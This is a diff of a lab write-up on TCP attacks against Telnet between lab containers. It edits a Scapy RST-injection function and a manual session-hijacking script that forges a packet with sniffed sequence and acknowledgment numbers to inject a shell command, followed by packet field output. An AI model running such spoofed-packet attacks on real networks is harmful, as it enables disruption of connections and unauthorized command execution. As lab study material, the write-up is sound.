@@ -153,7 +153,7 @@ def sendrst(pkt):
         sp = pkt[TCP].sport
         seq_n = pkt[TCP].seq
         payload_l = len(pkt[TCP].payload)
-        tot_seq = seq_n+payload_l
+        tot_seq = seq_n+payload_l #IMPORTANT
         tcp = TCP(sport=sp, dport=23, flags="R", seq=tot_seq, ack=0)
 
         pkt = ip/tcp
@@ -192,25 +192,20 @@ root@472341f5fb4b:/#
 
 ## Manual
 
-To Hijack an existing connection we first sniff with wireshark needed information (ports, flags, seq and ack numbers).
+To hijack an existing connection we first sniff with Wireshark the needed informations (ports, flags, SEQ and ACK numbers).
 
 First, we want to get the **Sequence Number**: we look for the last packet sent from the client (10.9.0.6) to the server (10.9.0.5) with flags `PSH/ACK` and get both the SEQ number and the size of the payload. 
 
 Then we need to find the **Acknowledgment Number**: we look for the last packet in that same direction, but with flag `ACK`, and we get the ACK number.
 
 ```py
-#!/usr/bin/env python3
-
+ #!/usr/bin/env python3
 from scapy.all import *
 
+data = "echo nano > /home/seed/prova.txt \r\n"
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
+tcp = TCP(sport=58264, dport=23, flags="A", seq=757678758, ack=2218560972)
 
-# SEQ: seq number (raw) in the the last PSH/ACK packet sent in that direction (in this case from 10.9.0.6 to 10.9.0.5) + size of data/payload in that packet.
-
-# ACK: ack number (raw) in the last ACK packet sent in that direction.
-
-tcp = TCP(sport=SRCPORT, dport=23, flags="PA", seq=SEQNUM, ack=ACKNUM)
-data = "echo hacked > /home/seed/hacked.txt\r\n"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt,verbose=0)
@@ -234,10 +229,10 @@ src        : SourceIPField                       = '10.9.0.6'      (None)
 dst        : DestIPField                         = '10.9.0.5'      (None)
 options    : PacketListField                     = []              ([])
 --
-sport      : ShortEnumField                      = 47640           (20)
+sport      : ShortEnumField                      = 58264           (20)
 dport      : ShortEnumField                      = 23              (80)
-seq        : IntField                            = 148153676       (0)
-ack        : IntField                            = 525521666       (0)
+seq        : IntField                            = 757678758       (0)
+ack        : IntField                            = 2218560972      (0)
 dataofs    : BitField  (4 bits)                  = None            (None)
 reserved   : BitField  (3 bits)                  = 0               (0)
 flags      : FlagsField  (9 bits)                = <Flag 24 (PA)>  (<Flag 2 (S)>)
